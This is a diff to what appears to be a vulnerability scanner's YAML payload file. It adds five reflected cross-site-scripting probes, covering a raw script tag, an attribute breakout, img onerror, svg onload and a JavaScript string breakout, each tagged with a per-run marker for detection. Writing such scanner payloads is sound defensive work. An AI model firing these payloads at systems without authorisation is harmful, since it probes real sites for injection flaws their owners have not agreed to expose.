@@ -1,8 +1,51 @@
+# Reflected-XSS payloads across multiple injection contexts (raw HTML body,
+# double-quoted attribute breakout, event handler, inline <script> string
+# breakout). {{TOKEN}} is replaced per-run with a random marker so a
+# "reflected" match only fires on the exact payload this run sent, not on
+# unrelated static text elsewhere on the page.
 - id: xss-script-tag
   finding_id: payload-xss-reflect
-  payload: "<script>alert(1)</script>"
+  payload: "<script>alert(/{{TOKEN}}/)</script>"
   severity: medium
-  description: Payload reflected in response
+  description: Raw <script> payload reflected unescaped in the response body
+  match:
+    any:
+      - reflected: true
+- id: xss-attribute-breakout
+  finding_id: payload-xss-reflect
+  payload: "\"><script>alert(/{{TOKEN}}/)</script>"
+  severity: medium
+  description: Attribute-breakout payload reflected unescaped, closing a surrounding HTML attribute
+  match:
+    any:
+      - reflected: true
+- id: xss-img-onerror
+  finding_id: payload-xss-reflect
+  payload: "<img src=x onerror=alert(/{{TOKEN}}/)>"
+  severity: medium
+  description: Event-handler payload reflected unescaped in the response body
+  match:
+    any:
+      - reflected: true
+- id: xss-svg-onload
+  finding_id: payload-xss-reflect
+  payload: "<svg onload=alert(/{{TOKEN}}/)>"
+  severity: medium
+  description: SVG onload payload reflected unescaped in the response body
+  match:
+    any:
+      - reflected: true
+- id: xss-js-string-breakout
+  finding_id: payload-xss-reflect
+  payload: "';alert(/{{TOKEN}}/);//"
+  severity: medium
+  description: >-
+    JS-string-context breakout payload (apostrophe) reflected unescaped,
+    likely inside an inline <script> block. Note: apps that naively treat
+    any apostrophe as a SQL-injection signal (like this repo's toy
+    app5-injectable fixture) may misclassify this input server-side before
+    it ever reaches the reflection sink -- that is a fixture limitation,
+    not a reason to drop the payload for real targets.
   match:
     any:
       - reflected: true
